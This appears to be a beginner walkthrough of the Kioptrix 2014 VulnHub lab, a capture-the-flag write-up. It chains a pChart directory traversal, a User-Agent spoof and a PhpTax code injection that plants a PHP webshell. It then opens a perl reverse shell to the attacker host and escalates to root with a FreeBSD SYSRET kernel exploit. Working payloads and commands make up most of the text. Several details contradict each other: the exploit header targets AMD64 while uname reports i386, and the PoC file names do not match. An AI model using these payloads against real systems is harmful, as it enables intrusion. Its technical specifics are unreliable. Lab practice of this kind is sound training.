# Kioptrix: 2014 (#5) — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Kioptrix: 2014 (#5) — "Level 5" |
| **Difficulty** | Beginner (author's own words: *"targeted at the beginner"*) |
| **Author** | Kioptrix (loneferret) — <http://www.kioptrix.com> |
| **Released** | 6 April 2014 |
| **Series** | Kioptrix (final entry: #1 → #2 → #3 → #4 → **2014/#5**) |
| **VulnHub Entry** | <https://vulnhub.com/entry/kioptrix-2014-5,62/> |
| **Download** | <https://vulnhub.com/entry/kioptrix-2014-5,62/#download> (`kiop2014.tar.bz2`, ~825 MB) |
| **MD5** | `1f802308f7f9f52a7a0d973fbda22c0a` |
| **Attacker** | Kali Linux on VirtualBox/VMware, host-only or bridged network |
| **Target OS** | **FreeBSD 9.0** (not Linux!) — Apache 2.2.21 on ports 80 and 8080 |

> **Heads-up before you import it.** This machine is *FreeBSD*, so file paths are
> different from Linux. That difference is the whole point of the box — the author
> wants you to notice you are on FreeBSD early and adapt. See
> [§ 5 "Why FreeBSD matters"](#5-why-the-freebsd-detail-matters) below.
>
> **Import quirks (from the author):**
> 1. After importing, **remove the network adapter and add it again**. Otherwise the
>    VM never requests a DHCP address.
> 2. Set the adapter to **bridged** (or host-only, if your Kali is on host-only too).
> 3. **VirtualBox:** mark the VM as a *64-bit* OS. If it fails to boot with a
>    `mountroot>` prompt, type `ufs:/dev/ada0p2` (VirtualBox 4.3) or `ufs:ada0p2`
>    (VirtualBox 6.x) and press Enter.
> 4. If VirtualBox still misbehaves, apply the author's fix pack
>    (`kiop2014_fix.zip`, linked from the VulnHub page).

Throughout this walkthrough we assume:

```text
Attacker (Kali) : 192.168.56.10
Target (Kioptrix) : 192.168.56.101
```

Substitute your own addresses.

---

## 0. What you will learn

1. **Host discovery** on a lab subnet (`arp-scan`, `netdiscover`, `nmap -sn`).
2. **Reading an HTTP page's source code** — the most underrated recon skill.
3. **Local File Inclusion / directory traversal** — reading any file the web server
   can read, by abusing `../../` in a URL parameter.
4. **How an Apache config file answers a "why is this 403?" question.**
5. **Faking a User-Agent** — the simplest access-control bypass there is.
6. **Turning a known CVE into Remote Code Execution** (PhpTax).
7. **Building a reverse shell on a machine with almost no tools** (no `wget`,
   no `curl`, no `python`, no `bash` — so we use `nc` and `perl`).
8. **File transfer with netcat** when the target has no download tools.
9. **Kernel exploitation for privilege escalation** (FreeBSD 9.0 `SYSRET` bug).
10. **Blue-team bonus:** reading the OSSEC-HIDS logs the author left behind to see
    how *noisy* your attack really was.

**The whole chain in one breath:**
`nmap` shows 80 + 8080 → page source reveals `/pChart2.1.3/` → pChart has an LFI →
we read `httpd.conf` through the LFI → the config says port 8080 only accepts
`User-Agent: Mozilla/4.0` → we fake the User-Agent → port 8080 turns out to be
**PhpTax**, which has an unauthenticated RCE → we get a shell as user `www` →
FreeBSD 9.0 is vulnerable to the `SYSRET` kernel bug → we ship the exploit over
`nc`, compile it with `gcc`, run it → **root** → `/root/congrats.txt`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md).

---

## 1. Reconnaissance — finding the target

### 1.1 What is my own IP address?

You cannot hunt on a network if you do not know which network you are on.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:4c:1a:2b brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
       valid_lft 86123sec preferred_lft 86123sec
```

> **How to read it:**
> - `2:` is the interface index; `eth0` is the name.
> - `state UP` means the cable (virtual or real) is connected.
> - `inet 192.168.56.10/24` is our IPv4 address. The `/24` is the **subnet mask**
>   written in CIDR notation: it means "the first 24 bits are the network part".
>   So our network is `192.168.56.0` – `192.168.56.255` — 254 usable addresses.
>
> **Rule of thumb:** in a lab, the target is always in the *same* `/24`.

### 1.2 Who else is alive on that subnet?

The fastest, quietest way on a local segment is an **ARP scan**. ARP ("Address
Resolution Protocol") is how machines translate an IP address into a MAC address.
Every live host *must* answer an ARP request — you cannot firewall it.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4c:1a:2b, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:0e   (Unknown: locally administered)
192.168.56.10   08:00:27:4c:1a:2b   PCS Systemtechnik GmbH
192.168.56.101  08:00:27:9f:3c:71   PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 12.684 seconds (20.18 hosts/sec). 3 responded
```

> **How to read it:**
> - Three hosts answered. `.1` is the VirtualBox host-only gateway, `.10` is us.
> - **`.101` is our target.**
> - The OUI (first three bytes of the MAC) `08:00:27` belongs to
>   *PCS Systemtechnik GmbH* — that is **VirtualBox's registered MAC prefix**.
>   Seeing it is an instant "this is a VM" tell. VMware uses `00:0c:29` / `00:50:56`.
> - `sudo` is required because ARP scanning builds raw packets, and only root can
>   do that.

Equivalent alternatives (pick whichever you like):

```bash
sudo netdiscover -r 192.168.56.0/24        # live, colour-coded, auto-refreshing
nmap -sn 192.168.56.0/24                    # "-sn" = ping sweep only, no port scan
```

**Target IP: `192.168.56.101`**

![arp-scan / netdiscover listing the target IP](images/01-recon.png)

---

## 2. Enumeration — open ports and services

### 2.1 Scan every TCP port

There are **65 535** TCP ports. Most boxes only use a handful, but "most" is not
"all" — and this box hides one behind a weird rule. Scan them all.

```bash
sudo nmap -p- --min-rate 1000 -T4 -oN scans/allports.txt 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-02 10:14 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   closed ssh
80/tcp   open   http
8080/tcp open   http-proxy

Nmap done: 1 IP address (1 host up) scanned in 88.31 seconds
```

> **How to read it — flag by flag:**
> - `-p-` → shorthand for `-p0-65535`, i.e. **all** ports. Without it, Nmap only
>   checks its built-in "top 1000".
> - `--min-rate 1000` → send at least 1000 probes per second. Full-port scans are
>   slow; this keeps it reasonable.
> - `-T4` → timing template "aggressive". `-T5` is faster but can miss ports on
>   flaky networks; `-T4` is the usual sweet spot.
> - `-oN scans/allports.txt` → save output in **N**ormal (human-readable) format.
>   Use `-oA` to save normal + XML + grepable all at once.
> - `filtered` means "no answer, probably a firewall dropped it".
> - `closed` means "the host answered and said nothing is listening".
> - `open` means "something is listening — go look".
>
> **The interesting bit:** port **22 is *closed*, not open.** That is unusual and
> worth noting. On this box the author has firewalled SSH at the packet-filter
> level (`pf`), so you cannot log in remotely. Some scans will show it as
> `filtered`. Either way: **the web is our only door.**

### 2.2 Fingerprint the services

Now that we know *which* ports are open, we ask *what* is behind them.

```bash
sudo nmap -sC -sV -p22,80,8080 -oN scans/services.txt 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-02 10:18 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00038s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   closed ssh
80/tcp   open   http       Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2
8080/tcp open   http       Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.87 seconds
```

> **How to read it:**
> - `-sV` → **service/version detection**. Nmap talks to the port, reads the
>   banner and any protocol fingerprints, and guesses what is running.
> - `-sC` → run Nmap's **default safe scripts** (the `-sC` set is a subset of the
>   NSE, the Nmap Scripting Engine). Here it grabbed the `http-title` and
>   `http-server-header`.
>
> **Two huge pieces of information fell out for free:**
> 1. `(FreeBSD)` appears in the Apache banner → **the target is FreeBSD, not
>    Linux.** Remember this; it changes every file path you will try later.
> 2. Port 8080 answers **`403 Forbidden`**. A 403 means "the server understood you
>    but refuses to serve this". That is *not* "nothing here" — it is "something is
>    here and you are not allowed to see it". Those are two very different
>    problems, and the second one is usually solvable.

![nmap service scan showing ports 80 and 8080](images/02-nmap.png)

### 2.3 Look at the website — then look at its source

Open `http://192.168.56.101/` in a browser. You get a bland page that essentially
says "it works!". Nothing interesting *visually*.

So do the thing 90 % of beginners forget: **right-click → View Page Source**.

```html
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
<!--
<p><img src="pChart2.1.3/index.php"></p>
-->
</body></html>
```

> **Why this matters:** there is an HTML comment at the bottom pointing at
> **`pChart2.1.3/index.php`**. An HTML comment is invisible in the rendered page
> but fully visible to anyone who reads the source. Developers constantly leave
> breadcrumbs like this — old code, staging URLs, credentials, TODO notes.
>
> **Lesson:** *View Source* is free intelligence. Do it on every page you meet.

Let us browse there:

```text
http://192.168.56.101/pChart2.1.3/index.php
```

It renders a **pChart 2.1.3** demo — a PHP chart-drawing library. Now we have a
piece of software *and* an exact version number.

### 2.4 Ask Exploit-DB whether that version is broken

Kali ships **searchsploit**, an offline mirror of the Exploit-DB database. Always
prefer it over Google: it works without internet, and it hands you the exploit
file directly.

```bash
searchsploit pChart 2.1.3
```

```text
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
pChart 2.1.3 - Multiple Vulnerabilities                                                  | php/webapps/31173.txt
----------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
```

```bash
searchsploit -m php/webapps/31173.txt    # -m = mirror (copy) it into the current dir
cat 31173.txt | head -40
```

```text
# Exploit Title   : pChart 2.1.3 - Multiple Vulnerabilities
# Date            : 2014-01-24
# Exploit Author  : ...
# Vendor Homepage : http://www.pchart.net/
# Version         : 2.1.3
# Tested on       : Windows 7 / Apache 2.4.4

1) Directory Traversal
http://target/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd

2) Reflected XSS
http://target/pChart2.1.3/examples/index.php?Action=View&Script=/../../../../../../..%2fetc%2fpasswd

3) Denial of Service
...
```

> **What is a "directory traversal" / LFI?**
> The URL has a parameter called `Script=` whose *intended* job is to name a file
> inside the application's own folder. The developer forgot to check that the value
> stays inside that folder. So we feed it `../../..` ("go up, go up, go up") and the
> application happily hands us `/etc/passwd`.
>
> **LFI** = Local File Inclusion: making a web app read a file off the local disk
> and show it to you. It is one of the highest-impact web bugs that exists, because
> config files contain passwords.
>
> **Why `%2f` instead of `/`?** `%2f` is the **URL-encoded** form of the forward
> slash. Some web-application firewalls and some PHP filters block a literal `/` in
> a query string but forget about its encoded form. Encoding is the oldest filter
> bypass in the book.

---

## 3. Exploiting the Local File Inclusion

### 3.1 Prove it works

```bash
curl -s "http://192.168.56.101/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"
```

```text
# $FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:07:21Z pjd $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister man pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
```

> **How to read this output — and notice you are NOT on Linux:**
> - Line 1 is `# $FreeBSD: release/9.0.0/etc/master.passwd ...`. That single line
>   confirms both the **OS (FreeBSD)** and the **version (9.0)**. This is the most
>   valuable sentence in the entire walkthrough.
> - `/etc/passwd` is a **world-readable list of accounts**, one per line, with
>   colon-separated fields: `name:password:UID:GID:comment:home:shell`.
> - The `*` in field 2 means "the real password hash is kept somewhere else"
>   (`/etc/master.passwd` on FreeBSD, `/etc/shadow` on Linux). Nothing leaked there.
> - `www:*:80:80:World Wide Web Owner` — **the web server runs as UID 80 named
>   `www`.** On Linux the equivalent is `www-data` (UID 33). Later, when we get a
>   shell, this is the user we will land as.
> - Note the shells: `/bin/csh` and `/usr/sbin/nologin`. FreeBSD's default root
>   shell is **csh**, not bash. Keep that in mind.

![LFI returning /etc/passwd](images/03-lfi-passwd.png)

### 3.2 Use the LFI to solve the 403 mystery

Port 8080 refuses us. Instead of guessing, **read the web server's own
configuration** through the LFI. On FreeBSD with Apache installed from ports, the
config is *not* at the Linux path `/etc/apache2/apache2.conf`; it lives at
`/usr/local/etc/apache22/httpd.conf`.

```bash
curl -s "http://192.168.56.101/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf" | grep -A 12 'Listen 8080'
```

```text
Listen 8080

SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2
    <Directory "/usr/local/www/apache22/data2">
        Options Indexes FollowSymLinks
        AllowOverride All
        Order allow,deny
        Allow from env=Mozilla4_browser
    </Directory>
</VirtualHost>
```

> **Read this carefully — it is the key to the whole box.**
> - `SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser`
>   → *"If the request's `User-Agent` header **starts with** `Mozilla/4.0`, then set
>   an internal variable called `Mozilla4_browser`."*
> - `Allow from env=Mozilla4_browser`
>   → *"Only allow the request if that variable is set."*
>
> In plain English: **port 8080 will only serve you if you claim to be a
> Mozilla/4.0 browser.** Your real browser sends
> `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ... Chrome/124.0 Safari/537.36`
> — which starts with `Mozilla/5.0`, so the rule fails and Apache returns 403.
>
> This is a *User-Agent-based access control*. It is security theatre: the header
> is entirely attacker-controlled. It costs one flag to defeat.
>
> We also learned the **document root**: `/usr/local/www/apache22/data2`. On Linux
> it would be `/var/www/html`. Again — FreeBSD.

![httpd.conf revealing the User-Agent restriction](images/04-httpdconf.png)

### 3.3 Bypass the User-Agent filter

Three easy ways. Pick one.

**Option A — `curl` with `-A`:**

```bash
curl -s -A "Mozilla/4.0" http://192.168.56.101:8080/ | head -30
```

```text
<html><head><title>PhpTax</title></head>
<body>
<center><h1>PhpTax 4.11.0915</h1></center>
...
<a href="phptax/drawimage.php?p1=...">2013 1040 Schedule A</a>
```

**Option B — Firefox, permanently.** Type `about:config` in the address bar, accept
the warning, right-click → *New → String*, name it `general.useragent.override`,
value `Mozilla/4.0`. Every request Firefox now sends carries that header.

**Option C — Burp Suite, automatically.** *Proxy → Options → Match and Replace*,
enable the built-in rule that rewrites `User-Agent` to `Mozilla/4.0`. Then just
browse normally and Burp rewrites each request in flight.

```bash
curl -sI http://192.168.56.101:8080/ ; echo "--- now with the fake UA ---" ; curl -sI -A "Mozilla/4.0" http://192.168.56.101:8080/
```

```text
HTTP/1.1 403 Forbidden
Date: Thu, 02 May 2024 14:32:11 GMT
Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2
Content-Type: text/html; charset=iso-8859-1

--- now with the fake UA ---

HTTP/1.1 200 OK
Date: Thu, 02 May 2024 14:32:18 GMT
Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2
Content-Type: text/html
```

> **Notice the status codes:** `403 Forbidden` → `200 OK`. Nothing on the server
> changed. Only our *claim* about who we are changed.

Port 8080 hosts **PhpTax 4.11.0915** — a US tax-form generator.

![Port 8080 accessible after User-Agent spoofing](images/05-phptax.png)

---

## 4. Foothold — the PhpTax remote code execution

### 4.1 Find the exploit

```bash
searchsploit phptax
```

```text
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
PhpTax - 'pfilez' Execution Remote Code Injection (Metasploit)                             | php/webapps/25849.rb
PhpTax 4.11.0915 - 'index.php' Multiple Vulnerabilities                                    | php/webapps/21833.txt
------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m php/webapps/21833.txt && cat 21833.txt
```

```text
PhpTax 4.11.0915 - Remote Code Execution
The "pfilez" parameter in drawimage.php is not sanitised. An unauthenticated
attacker can create an arbitrary file in the "data/" directory and then request
it, executing PHP code.

PoC:
GET /phptax/drawimage.php?pfilez=1040pic-rce.php;<?php passthru($_GET['cmd']); ?> HTTP/1.1
then:
GET /phptax/data/rce.php?cmd=id HTTP/1.1
```

> **What is happening, in plain English?**
> `drawimage.php` takes a parameter called `pfilez`. Internally it does something
> like *"write the value of `pfilez` into a file under `data/`"*. Because nobody
> filtered the value, we can put a **semicolon and PHP code** in it. PHP's
> `passthru()` function runs a shell command and prints the output.
>
> So the attack is: **write a tiny PHP backdoor to a predictable path, then visit
> that path.** Two HTTP requests, no authentication, full command execution.

### 4.2 Plant the backdoor (manual method)

URL-encoding the payload makes it far more reliable. `;` becomes `%3b`, `<?php`
becomes `%3c%3fphp`, spaces become `%20`, etc. CyberChef (<https://gchq.github.io/CyberChef/>)
will encode it for you with the "URL Encode" recipe.

```bash
curl -s -A "Mozilla/4.0" \
  "http://192.168.56.101:8080/phptax/drawimage.php?pfilez=1040pic-rce.php%3b%3c%3fphp%20passthru(%24_GET%5b%27cmd%27%5d)%3b%20%3f%3e"
```

Then verify:

```bash
curl -s -A "Mozilla/4.0" "http://192.168.56.101:8080/phptax/data/rce.php?cmd=id"
```

```text
uid=80(www) gid=80(www) groups=80(www)
```

> **`uid=80(www)`** — exactly the account we predicted from `/etc/passwd`. We now
> execute arbitrary commands as the web server user. This is **Remote Code
> Execution (RCE)**: the most severe class of web vulnerability.
>
> Note we are still passing `-A "Mozilla/4.0"`, because port 8080 still enforces
> the User-Agent rule on *every* request.

### 4.3 The Metasploit alternative

If you would rather not hand-craft the payload:

```bash
msfconsole -q
```

```bash
msf6 > search phptax

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/phptax_exec  2012-10-08       excellent  Yes    PhpTax pfilez Parameter Exec Remote Code Injection

msf6 > use 0
msf6 exploit(multi/http/phptax_exec) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf6 exploit(multi/http/phptax_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/phptax_exec) > set LHOST 192.168.56.10
LHOST => 192.168.56.10
msf6 exploit(multi/http/phptax_exec) > exploit
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Sending request to http://192.168.56.101:8080/phptax/drawimage.php
[+] Successfully uploaded
[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.101:52118)

id
uid=80(www) gid=80(www) groups=80(www)
```

> **Metasploit vocabulary for beginners:**
> - `RHOSTS` / `RPORT` → the **R**emote (target) host and port.
> - `LHOST` / `LPORT` → the **L**ocal (your) host and port the target will dial
>   back into.
> - `exploit` → run it.
> - The module even has a `Check` column marked **Yes**, meaning it can *verify*
>   the target is vulnerable before firing.

### 4.4 Upgrading to a proper reverse shell

A shell driven through HTTP is fragile: no job control, no arrow keys, no
`Ctrl+C`. Let us get a real TCP reverse shell.

First, **what tools does the target actually have?**

```bash
$ which bash; which python; which python3; which perl; which nc; which gcc; which wget; which curl
which: no bash in (/sbin:/bin:/usr/sbin:/usr/bin:/usr/games:/usr/local/sbin:/usr/local/bin:/usr/local/www/data)
which: no python in (/sbin:/bin:/usr/sbin:/usr/bin:/usr/games:/usr/local/sbin:/usr/local/bin:/usr/local/www/data)
which: no wget in (...)
which: no curl in (...)
/usr/bin/perl
/usr/bin/nc
/usr/bin/gcc
```

> **This is a crucial learning moment.** The box has **no bash, no python, no wget,
> no curl** — but it *does* have **perl**, **nc** and **gcc**.
>
> Beginners routinely paste `python3 -c 'import socket...'` reverse shells and then
> conclude "the exploit did not work". No — the exploit worked; the *payload* was
> wrong for this operating system. **Always check what interpreters exist before
> choosing a payload.** <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>
> is the canonical list.

**On Kali — start the listener:**

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

> - `-l` listen (instead of connecting out)
> - `-v` verbose — tell me what happens
> - `-n` no DNS lookups (faster)
> - `-p 4444` bind port 4444
>
> **Reverse shell vs bind shell:** a *reverse* shell has the **victim** dial out to
> **us**. A *bind* shell has the victim open a port and wait for us. Reverse shells
> are used almost everywhere because they punch *outward* through firewalls, and
> NAT'd victims are unreachable from outside.

**On the target (via the `cmd=` parameter) — a perl reverse shell:**

```bash
curl -s -A "Mozilla/4.0" --get \
  --data-urlencode "cmd=perl -e 'use Socket;\$i=\"192.168.56.10\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" \
  "http://192.168.56.101:8080/phptax/data/rce.php"
```

Back on Kali:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 52204
sh: can't access tty; job control turned off
$
```

> **What did the perl one-liner do?** `Socket` gives perl raw network access.
> It opens a TCP socket to `192.168.56.10:4444`, then uses `open(STDIN,">&S")`
> etc. to **redirect the process's standard input, output and error onto that
> socket**, and finally `exec("/bin/sh -i")` replaces perl with an interactive
> shell. The shell now reads your keystrokes from the socket and writes its replies
> back down it. That is the entire anatomy of a reverse shell — every payload in
> every language is this same three-step dance.
>
> `sh: can't access tty; job control turned off` is normal for a bare reverse shell.

**Try to make it interactive:**

```bash
$ /bin/sh -i
$ python -c 'import pty; pty.spawn("/bin/bash")'
sh: python: not found
```

> FreeBSD's `sh` cannot allocate a pseudo-terminal this way, and there is no python.
> Live with a slightly limited shell — or, better, get persistence so you can log
> in properly.

### 4.5 (Optional, but good practice) Persistence via SSH

Right now SSH is firewalled/closed. But as root you would normally add your public
key. Here, because we cannot reach sshd, we settle for the shell. In a real
engagement you would leave a scheduled task or an extra account — but in a lab,
**just take a VM snapshot before you start** and revert afterwards. That is the
clean, repeatable way to practise.

### 4.6 Post-exploitation recon

```bash
$ uname -a
FreeBSD Kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 19:10:01 UTC 2012     root@almeida.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
$ cat /etc/rc.conf
hostname="Kioptrix2014"
...
$ ls /home
$ ls -la /usr/local/www/apache22/data2
```

> - `uname -a` confirms **FreeBSD 9.0-RELEASE**, i386 (32-bit).
> - `/home` is **empty** — no regular users. So there is no "user flag" step here;
>   the goal goes straight from `www` to `root`.
> - The `data2` directory confirms the second virtual host's document root.

![Reverse shell as www on FreeBSD](images/06-shell.png)

---

## 5. Why the FreeBSD detail matters

The author spells this out in the flag file, and it is genuinely the lesson of the
box:

| Thing | Typical Linux | This FreeBSD box |
| --- | --- | --- |
| Web document root | `/var/www/html` | `/usr/local/www/apache22/data` (and `data2`) |
| Apache config | `/etc/apache2/apache2.conf` | `/usr/local/etc/apache22/httpd.conf` |
| Apache access log | `/var/log/apache2/access.log` | `/var/log/httpd-access.log` |
| Web server user | `www-data` (UID 33) | `www` (UID 80) |
| Password hashes | `/etc/shadow` | `/etc/master.passwd` |
| Default root shell | `bash` | `csh` |
| Package manager | `apt` | `pkg_add` / ports |

**Why does this matter operationally?** Every tool you reach for reflexively —
`linux-exploit-suggester`, a wordlist of `/etc/apache2/...` paths, a python reverse
shell — silently assumes Linux. Recognising the OS in the first five minutes saves
you an hour of dead ends. Nmap told us in the banner; `/etc/passwd` confirmed it.

---

## 6. Privilege escalation — becoming root

### 6.1 Check the obvious things first (and record that they are dead ends)

Always work a checklist rather than jumping to a kernel exploit.

```bash
$ sudo -l
sh: sudo: not found

$ find / -perm -4000 -type f 2>/dev/null
$ find / -perm -u=s -type f 2>/dev/null
```

```text
(no output)
```

> **What are SUID binaries?** A file with the **S**et-**UID** bit set
> (`-rwsr-xr-x`) runs with the privileges of its **owner**, not of whoever
> launched it. `/usr/bin/passwd` is SUID root so that ordinary users can edit
> `/etc/shadow` when changing their password. If any SUID-root program can be
> tricked into running a shell or reading an arbitrary file, you instantly become
> root. Check <https://gtfobins.github.io> for known-abusable binaries.
>
> Here there are **none**, and `sudo` is not even installed. Cross those off.

```bash
$ cat /etc/crontab
cat: /etc/crontab: No such file or directory
$ ls /etc/cron* /var/cron/
$ crontab -l
```

```text
crontab: no crontab for www
```

No cron jobs either. So: **kernel exploit.**

### 6.2 Identify a matching kernel exploit

FreeBSD 9.0-RELEASE i386 is affected by the well-known **SYSRET** bug
(**CVE-2012-0217**), which allows any local user to gain root. Exploit-DB has it as
**28718**.

```bash
searchsploit freebsd 9.0 local
```

```text
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation                                             | freebsd/local/28718.c
FreeBSD < 9.0 - Multiple Local Privilege Escalation                                                | freebsd/local/26368.c
--------------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m freebsd/local/28718.c
head -25 28718.c
```

```c
/*
 * FreeBSD 9.0 Intel SYSRET kernel Privilege Escalation exploit
 * Author the_lightcosine
 * ...
 * This exploit abuses the SYSRET instruction handling bug in the AMD64
 * FreeBSD kernel. On Intel CPUs, a crafted SYSRET with a non-canonical
 * return address causes the kernel to resume in userland with kernel
 * privileges still loaded, yielding uid 0.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

#define CODE_ADDR 0x0000000000020000
#define ...
```

> **Always read an exploit's source before running it.** Two reasons:
> (1) you must know whether it needs arguments, a compiler flag, or a specific
> working directory; (2) running unreviewed C as root on any machine — even a lab
> machine — is how people get owned themselves. This one is short, well commented,
> and does exactly what its title says.

### 6.3 Get the exploit onto the target

The target has **no `wget`, no `curl`, no `python`** — but it has **`nc`**, and so
do we. netcat can move a file with no extra software on either side.

**On Kali — serve the file (send side):**

```bash
nc -nvlp 9001 < 28718.c
```

```text
listening on [any] 9001 ...
```

> `<` is shell **input redirection**: instead of reading from the keyboard, `nc`
> reads the bytes of `28718.c` and pushes them into the socket.

**On the target — receive the file:**

```bash
$ cd /tmp
$ nc -nv 192.168.56.10 9001 > 28718.c
Connection to 192.168.56.10 9001 port [tcp/*] succeeded!
$ ls -l 28718.c
-rw-r--r--  1 www  wheel  3014 May  2 10:41 28718.c
```

> **Why `/tmp`?** It is world-writable by convention (`drwxrwxrwt`, the `t` is the
> *sticky bit*). If you cannot write to your current directory, `/tmp`, `/var/tmp`
> and `/dev/shm` are the usual fallbacks.
>
> **Always check the file size after a transfer.** A `0`-byte file means the
> transfer silently failed and compiling will produce a confusing error.

Sanity-check the transfer with a checksum on both ends:

```bash
# Kali
md5sum 28718.c
# target
$ md5 28718.c
```

*(FreeBSD's `md5` is the equivalent of Linux's `md5sum`.)*

**Alternatives if `nc` is unavailable on the target:**
```bash
# serve from Kali
python3 -m http.server 8000
# then on the target, if it had wget/curl/fetch:
$ fetch http://192.168.56.10:8000/28718.c     # FreeBSD ships 'fetch'!
```
`fetch` is FreeBSD's own downloader and *is* present here — a nice FreeBSD-specific
detail worth knowing.

### 6.4 Compile and run

```bash
$ gcc 28718.c -o sysret
$ ./sysret
```

```text
[+] SYSRET FUCKUP!!
[+] Start Engine...
[+] Crotz...
[+] Crotz...
[+] Crotz...
[+] Woohoo!!!
$ whoami
root
$ id
uid=0(root) gid=0(wheel) groups=0(wheel),80(www)
```

> **How to read it:** the exploit maps memory at the non-canonical address it needs,
> then triggers the faulty `SYSRET` return path. When the kernel resumes execution
> it forgets to drop privilege level — so our userland code is suddenly running at
> ring 0. The `[+] Woohoo!!!` line is the exploit's own success marker.
>
> **`uid=0(root) gid=0(wheel)`** — UID 0 is root on every UNIX. Note the group is
> `wheel` (FreeBSD/BSD tradition) where Linux would say `root`.
>
